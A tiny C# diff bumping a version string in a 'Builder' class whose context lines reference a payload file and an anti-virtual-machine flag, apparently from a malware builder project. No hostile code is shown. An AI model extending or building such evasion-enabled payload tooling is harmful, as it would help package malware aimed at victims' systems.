@@ -28,7 +28,7 @@ namespace Umbral.builder.Build
 
     public class Builder
     {
-        private const string Version = "v1.1";
+        private const string Version = "v1.2";
         private const string PayloadFile = "Umbral.payload";
         public bool AntiVm;
 
